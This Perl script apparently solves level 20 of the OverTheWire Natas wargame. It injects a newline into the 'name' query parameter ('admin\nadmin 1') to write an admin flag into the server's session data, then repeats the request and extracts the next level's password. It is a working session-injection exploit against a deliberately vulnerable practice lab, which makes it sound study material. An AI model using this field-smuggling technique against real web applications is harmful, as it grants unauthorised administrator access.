#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use URI;
use v5.16.3;

my $user = 'natas20';

my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));
# Evil injection
$uri->query_form("name" => "admin\nadmin 1");

my $ua = LWP::UserAgent->new;
# Enable Cookies
my $cookie_jar = HTTP::Cookies->new();
$ua->cookie_jar( $cookie_jar );
my $request = new HTTP::Request('GET' => $uri);
# Make a double request. First inject admin rights, with the second request return password
$ua->request($request);
$_ = $ua->request($request)->content;
if (/Password: (.{32})/) {
  say "The password for natas21 is ".$1;
}
